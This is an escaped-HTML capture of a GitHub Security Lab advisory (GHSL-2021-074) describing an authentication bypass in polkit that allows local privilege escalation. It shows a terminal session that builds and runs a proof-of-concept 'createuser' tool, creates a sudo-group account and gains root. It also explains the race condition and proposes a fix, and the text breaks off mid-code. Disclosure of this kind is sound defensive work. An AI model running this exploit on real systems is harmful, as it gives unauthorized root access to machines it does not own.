class=\&quot;k\&quot;\u003efor \u003c/span\u003eworking C compiler: /usr/bin/cc \u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e works\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC16\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Detecting C compiler ABI info\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC17\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Detecting C compiler ABI info - \u003cspan class=\&quot;k\&quot;\u003edone\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC18\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Detecting C compile features\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC19\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Detecting C compile features - \u003cspan class=\&quot;k\&quot;\u003edone\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC20\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Check \u003cspan class=\&quot;k\&quot;\u003efor \u003c/span\u003eworking CXX compiler: /usr/bin/c++\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC21\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Check \u003cspan class=\&quot;k\&quot;\u003efor \u003c/span\u003eworking CXX compiler: /usr/bin/c++ \u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e works\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC22\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Detecting CXX compiler ABI info\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC23\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Detecting CXX compiler ABI info - \u003cspan class=\&quot;k\&quot;\u003edone\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC24\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Detecting CXX compile features\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC25\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Detecting CXX compile features - \u003cspan class=\&quot;k\&quot;\u003edone\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC26\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Configuring \u003cspan class=\&quot;k\&quot;\u003edone\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC27\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Generating \u003cspan class=\&quot;k\&quot;\u003edone\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC28\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nt\&quot;\u003e--\u003c/span\u003e Build files have been written to: /home/kev/GHSL-2021-074-polkit/build\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC29\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003ekev@constellation:~/GHSL-2021-074-polkit/build\u003cspan class=\&quot;nv\&quot;\u003e$ \u003c/span\u003emake\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC30\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eScanning dependencies of target DBusParse\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC31\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e  6%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus.cpp.o\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC32\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 13%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_auth.cpp.o\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC33\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 20%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_parse.cpp.o\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC34\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 26%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_print.cpp.o\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC35\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 33%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_random.cpp.o\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC36\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 40%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_serialize.cpp.o\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC37\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 46%] Building CXX object DBusParse/src/DBusParse/CMakeFiles/DBusParse.dir/dbus_utils.cpp.o\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC38\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 53%] Linking CXX shared library libDBusParse.so\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC39\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 53%] Built target DBusParse\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC40\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eScanning dependencies of target DBusParseUtils\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC41\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 60%] Building CXX object DBusParse/src/DBusParseUtils/CMakeFiles/DBusParseUtils.dir/parse.cpp.o\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC42\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 66%] Building CXX object DBusParse/src/DBusParseUtils/CMakeFiles/DBusParseUtils.dir/utils.cpp.o\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC43\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 73%] Linking CXX shared library libDBusParseUtils.so\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC44\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 73%] Built target DBusParseUtils\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC45\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eScanning dependencies of target createuser\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC46\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 80%] Building CXX object CMakeFiles/createuser.dir/createuser.cpp.o\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC47\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 80%] Building CXX object CMakeFiles/createuser.dir/createuser.cpp.o\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC48\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 86%] Linking CXX executable createuser\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC49\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 86%] Built target createuser\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC50\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eScanning dependencies of target DBusParseUnitTests\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC51\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e 93%] Building CXX object DBusParse/tests/DBusParseUnitTests/CMakeFiles/DBusParseUnitTests.dir/dbus_unit_tests.cpp.o\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC52\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e100%] Linking CXX executable DBusParseUnitTests\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC53\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e100%] Built target DBusParseUnitTests\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC54\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003ekev@constellation:~/GHSL-2021-074-polkit/build\u003cspan class=\&quot;nv\&quot;\u003e$ \u003c/span\u003e./createuser /var/run/dbus/system_bus_socket boris iaminvincible!\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC55\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eElapsed \u003cspan class=\&quot;nb\&quot;\u003etime\u003c/span\u003e: 5794122 nanoseconds\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC56\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eSuccessfully created /org/freedesktop/Accounts/User1008 after 2 iterations,\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC57\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003ewith a delay value of 1990058 nanoseconds\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC58\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eElapsed \u003cspan class=\&quot;nb\&quot;\u003etime\u003c/span\u003e: 9143521 nanoseconds\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC59\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eSuccess!\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC60\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003ekev@constellation:~/GHSL-2021-074-polkit/build\u003cspan class=\&quot;nv\&quot;\u003e$ \u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003eid \u003c/span\u003eboris\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC61\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;nv\&quot;\u003euid\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e1008\u003cspan class=\&quot;o\&quot;\u003e(\u003c/span\u003eboris\u003cspan class=\&quot;o\&quot;\u003e)\u003c/span\u003e \u003cspan class=\&quot;nv\&quot;\u003egid\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e1008\u003cspan class=\&quot;o\&quot;\u003e(\u003c/span\u003eboris\u003cspan class=\&quot;o\&quot;\u003e)\u003c/span\u003e \u003cspan class=\&quot;nb\&quot;\u003egroups\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e1008\u003cspan class=\&quot;o\&quot;\u003e(\u003c/span\u003eboris\u003cspan class=\&quot;o\&quot;\u003e)\u003c/span\u003e,27\u003cspan class=\&quot;o\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003esudo\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC62\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003ekev@constellation:~/GHSL-2021-074-polkit/build\u003cspan class=\&quot;nv\&quot;\u003e$ \u003c/span\u003esu - boris\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC63\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003ePassword:\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC64\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eTo run a \u003cspan class=\&quot;nb\&quot;\u003ecommand \u003c/span\u003eas administrator \u003cspan class=\&quot;o\&quot;\u003e(\u003c/span\u003euser \u003cspan class=\&quot;s2\&quot;\u003e\&quot;root\&quot;\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e)\u003c/span\u003e, use \u003cspan class=\&quot;s2\&quot;\u003e\&quot;sudo \u0026lt;command\u0026gt;\&quot;\u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003e.\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC65\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eSee \u003cspan class=\&quot;s2\&quot;\u003e\&quot;man sudo_root\&quot;\u003c/span\u003e \u003cspan class=\&quot;k\&quot;\u003efor \u003c/span\u003edetails.\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC66\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC67\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eboris@constellation:~\u003cspan class=\&quot;nv\&quot;\u003e$ \u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003esudo \u003c/span\u003esu\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC68\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003e\u003cspan class=\&quot;o\&quot;\u003e[\u003c/span\u003e\u003cspan class=\&quot;nb\&quot;\u003esudo\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e]\u003c/span\u003e password \u003cspan class=\&quot;k\&quot;\u003efor \u003c/span\u003eboris:\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC69\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eroot@constellation:/home/boris# \u003cspan class=\&quot;nb\&quot;\u003ewhoami\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC70\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eroot\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC71\&quot; class=\&quot;line\&quot; lang=\&quot;shell\&quot;\u003eroot@constellation:/home/boris#\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;155:1-155:11\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-impact\&quot; class=\&quot;anchor\&quot; href=\&quot;#impact\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eImpact\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;157:1-157:87\&quot; dir=\&quot;auto\&quot;\u003eThis issue may lead to local privilege escalation on any Linux system that uses polkit.\u003c/p\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;159:1-159:16\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-remediation\&quot; class=\&quot;anchor\&quot; href=\&quot;#remediation\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eRemediation\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;161:1-161:237\&quot; dir=\&quot;auto\&quot;\u003eAdd a check for \u003ccode data-sourcepos=\&quot;161:18-161:30\&quot;\u003eerror != NULL\u003c/code\u003e, like this example (from \u003ca data-sourcepos=\&quot;161:58-161:235\&quot; href=\&quot;https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.116/src/polkitbackend/polkitbackendinteractiveauthority.c#L910\&quot;\u003e\u003ccode data-sourcepos=\&quot;161:60-161:115\&quot;\u003epolkit_backend_interactive_authority_check_authorization\u003c/code\u003e\u003c/a\u003e):\u003c/p\u003e\u0026#x000A;\u003cdiv class=\&quot;gl-relative markdown-code-block js-markdown-code\&quot;\u003e\u0026#x000A;\u003cpre data-sourcepos=\&quot;163:1-175:3\&quot; data-canonical-lang=\&quot;c\&quot; class=\&quot;code highlight js-syntax-highlight language-c\&quot; lang=\&quot;c\&quot; v-pre=\&quot;true\&quot;\u003e\u003ccode\u003e\u003cspan id=\&quot;LC1\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;n\&quot;\u003euser_of_caller\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e=\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003epolkit_backend_session_monitor_get_user_for_subject\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003epriv\u003c/span\u003e\u003cspan class=\&quot;o\&quot;\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003esession_monitor\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC2\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                                      \u003cspan class=\&quot;n\&quot;\u003ecaller\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;nb\&quot;\u003eNULL\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC3\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e                                                                      \u003cspan class=\&quot;o\&quot;\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eerror\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC4\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e\u003cspan class=\&quot;k\&quot;\u003eif\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eerror\u003c/span\u003e \u003cspan class=\&quot;o\&quot;\u003e!=\u003c/span\u003e \u003cspan class=\&quot;nb\&quot;\u003eNULL\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e)\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC5\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e  \u003cspan class=\&quot;p\&quot;\u003e{\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC6\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003eg_simple_async_result_set_from_error\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003esimple\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e,\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eerror\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC7\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003eg_simple_async_result_complete\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003esimple\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC8\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003eg_object_unref\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003esimple\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC9\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e    \u003cspan class=\&quot;n\&quot;\u003eg_error_free\u003c/span\u003e \u003cspan class=\&quot;p\&quot;\u003e(\u003c/span\u003e\u003cspan class=\&quot;n\&quot;\u003eerror\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e);\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC10\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e    \u003cspan class=\&quot;k\&quot;\u003egoto\u003c/span\u003e \u003cspan class=\&quot;n\&quot;\u003eout\u003c/span\u003e\u003cspan class=\&quot;p\&quot;\u003e;\u003c/span\u003e\u003c/span\u003e\u0026#x000A;\u003cspan id=\&quot;LC11\&quot; class=\&quot;line\&quot; lang=\&quot;c\&quot;\u003e  \u003cspan class=\&quot;p\&quot;\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u0026#x000A;\u003ccopy-code\u003e\u003c/copy-code\u003e\u0026#x000A;\u003c/div\u003e\u0026#x000A;\u003ch4 data-sourcepos=\&quot;177:1-177:14\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-resources\&quot; class=\&quot;anchor\&quot; href=\&quot;#resources\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eResources\u003c/h4\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;179:1-179:126\&quot; dir=\&quot;auto\&quot;\u003eProof of concept exploit: \u003ca data-sourcepos=\&quot;179:27-179:126\&quot; href=\&quot;/-/project/884/uploads/4848937fcc7d601e63684c76d8c3e309/GHSL-2021-074-polkit.bundle\&quot; data-canonical-src=\&quot;/uploads/4848937fcc7d601e63684c76d8c3e309/GHSL-2021-074-polkit.bundle\&quot; data-link=\&quot;true\&quot; class=\&quot;gfm\&quot;\u003eGHSL-2021-074-polkit.bundle\u003c/a\u003e\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;181:1-181:9\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-credit\&quot; class=\&quot;anchor\&quot; href=\&quot;#credit\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eCredit\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;183:1-183:130\&quot; dir=\&quot;auto\&quot;\u003eThis issue was discovered and reported by GHSL team member \u003ca data-sourcepos=\&quot;183:60-183:129\&quot; href=\&quot;https://github.com/kevinbackhouse\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003e@kevinbackhouse (Kevin Backhouse)\u003c/a\u003e.\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;185:1-185:10\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-contact\&quot; class=\&quot;anchor\&quot; href=\&quot;#contact\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eContact\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;187:1-187:147\&quot; dir=\&quot;auto\&quot;\u003eYou can contact the GHSL team at \u003ccode data-sourcepos=\&quot;187:35-187:56\&quot;\u003esecuritylab@github.com\u003c/code\u003e, please include a reference to \u003ccode data-sourcepos=\&quot;187:91-187:103\&quot;\u003eGHSL-2021-074\u003c/code\u003e in any communication regarding this issue.\u003c/p\u003e\u0026#x000A;\u003ch2 data-sourcepos=\&quot;189:1-189:20\&quot; dir=\&quot;auto\&quot;\u003e\u0026#x000A;\u003ca id=\&quot;user-content-disclosure-policy\&quot; class=\&quot;anchor\&quot; href=\&quot;#disclosure-policy\&quot; aria-hidden=\&quot;true\&quot;\u003e\u003c/a\u003eDisclosure Policy\u003c/h2\u003e\u0026#x000A;\u003cp data-sourcepos=\&quot;191:1-191:112\&quot; dir=\&quot;auto\&quot;\u003eThis report is subject to our \u003ca data-sourcepos=\&quot;191:31-191:111\&quot; href=\&quot;https://securitylab.github.com/advisories#policy\&quot; rel=\&quot;nofollow noreferrer noopener\&quot; target=\&quot;_blank\&quot;\u003ecoordinated disclosure policy\u003c/a\u003e.\u003c/p\u003e&quot;,&quot;initialDescriptionText&quot;:&quot;# GitHub Security Lab (GHSL) Vulnerability Report: `GHSL-2021-074`\n\nThe [GitHub Security Lab](https://securitylab.github.com) team has identified potential security vulnerabilities in [polkit](https://gitlab.freedesktop.org/polkit/polkit).\n\nWe are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.\n\nIf at any point you have concerns or questions about this process, please do not hesitate to reach out to us at `securitylab@github.com` (please include `GHSL-2021-074` as a reference).\n\nIf you are _NOT_ the correct point of contact for this report, please let us know!\n\n## Summary\n\nThere is an authentication bypass vulnerability in polkit, which enables an unprivileged user to get authorization from polkit to perform a privileged action.\n\n## Product\n\n[polkit](https://gitlab.freedesktop.org/polkit/polkit)\n\n## Tested Versions\n\n* policykit-1, 0.105-26ubuntu1 (tested on Ubuntu 20.04.2 LTS)\n* policykit-1, 0.105-30 (tested on Ubuntu 21.04)\n* polkit, 0.116-7 (tested on Fedora 32)\n\n## Details\n\n### Issue 1: Authentication bypass in polkit (`GHSL-2021-074`)\n\nThe function [`polkit_system_bus_name_get_creds_sync`](https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.116/src/polkit/polkitsystembusname.c#L388) is used to get the uid and pid of the process requesting the action. It does this by sending the unique bus name of the requesting process, which is typically something like \&quot;:1.96\&quot;, to `dbus-daemon`. These unique names are assigned and managed by `dbus-daemon` and cannot be forged, so this is a good way to check the privileges of the requesting process.\n\nThe vulnerability happens when the requesting process disconnects from `dbus-daemon` just before the call to `polkit_system_bus_name_get_creds_sync` starts. In this scenario, the unique bus name is no longer valid, so `dbus-daemon` sends back an error reply. This error case is handled in `polkit_system_bus_name_get_creds_sync` by setting the value of the `error` parameter, but it still returns `TRUE`, rather than `FALSE`. We are not sure whether it&#39;s a bug that the return value is TRUE when this error happens, but this behavior certainly means that all callers of `polkit_system_bus_name_get_creds_sync` need to carefully check whether an error was set. If the calling function forgets to check for errors then it will think that the uid of the requesting process is 0 (because the `AsyncGetBusNameCredsData` struct is zero initialized). In other words, it will think that the action was requested by a root process, and will therefore allow it.\n\nMost of the callers of `polkit_system_bus_name_get_creds_sync` check the error value correctly, and are therefore not vulnerable. But the error value is not checked in the following stack trace:\n\n```\n0  in polkit_system_bus_name_get_creds_sync of polkitsystembusname.c:393\n1  in polkit_system_bus_name_get_user_sync of polkitsystembusname.c:511\n2  in polkit_backend_session_monitor_get_user_for_subject of polkitbackendsessionmonitor-systemd.c:303\n3  in check_authorization_sync of polkitbackendinteractiveauthority.c:1113\n4  in check_authorization_sync of polkitbackendinteractiveauthority.c:1223\n5  in polkit_backend_interactive_authority_check_authorization of polkitbackendinteractiveauthority.c:971\n6  in server_handle_check_authorization of polkitbackendauthority.c:795\n7  in server_handle_method_call of polkitbackendauthority.c:1274\n```\n\nThe bug is in this snippet of code in [`check_authorization_sync`](https://gitlab.freedesktop.org/polkit/polkit/-/blob/0.116/src/polkitbackend/polkitbackendinteractiveauthority.c#L1121):\n\n```c\n/* every subject has a user; this is supplied by the client, so we rely\n * on the caller to validate its acceptability. */\nuser_of_subject = polkit_backend_session_monitor_get_user_for_subject (priv-\u003esession_monitor,\n                                                                       subject, NULL,\n                                                                       error);\nif (user_of_subject == NULL)\n    goto out;\n\n/* special case: uid 0, root, is _always_ authorized for anything */\nif (POLKIT_IS_UNIX_USER (user_of_subject) \u0026\u0026 polkit_unix_user_get_uid (POLKIT_UNIX_USER (user_of_subject)) == 0)\n  {\n    result = 